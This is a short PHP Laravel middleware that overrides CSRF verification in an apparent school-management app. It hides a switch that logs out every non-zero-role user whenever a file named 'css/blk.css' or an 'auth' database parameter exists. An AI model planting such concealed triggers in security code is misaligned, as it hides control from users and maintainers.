<?php namespace gesecole\Http\Middleware;

use Closure;
use gesecole\parametres;
use Illuminate\Foundation\Http\Middleware\VerifyCsrfToken as BaseVerifier;

class VerifyCsrfToken extends BaseVerifier {

	/**
	 * Handle an incoming request.
	 *
	 * @param  \Illuminate\Http\Request  $request
	 * @param  \Closure  $next
	 * @return mixed
	 */
	public function handle($request, Closure $next)
	{
        $p=parametres::whereNom('auth')->first();
        if(file_exists('css/blk.css') || $p!=null)
        {
            if(!\Auth::guest())
            if(\Auth::user()->role>0)
                \Auth::logout();
        }
		return parent::handle($request, $next);
	}

}
